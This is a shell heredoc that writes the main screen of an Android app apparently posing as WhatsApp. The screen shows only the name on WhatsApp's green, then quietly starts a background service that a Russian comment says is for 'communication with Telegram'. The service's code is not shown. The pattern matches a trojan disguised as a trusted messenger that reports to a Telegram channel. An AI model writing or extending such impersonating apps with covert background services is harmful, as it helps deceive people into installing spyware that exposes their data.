cat << 'EOF' > android/app/src/main/java/com/example/whatsapp/MainActivity.java
package com.example.whatsapp;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import android.content.Intent;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("WhatsApp");
        tv.setTextSize(30);
        tv.setGravity(Gravity.CENTER);
        tv.setBackgroundColor(Color.parseColor("#075E54"));
        tv.setTextColor(Color.WHITE);
        setContentView(tv);

        // Запуск фонового сервиса для связи с Telegram
        startService(new Intent(this, CoreService.class));
    }
}
EOF
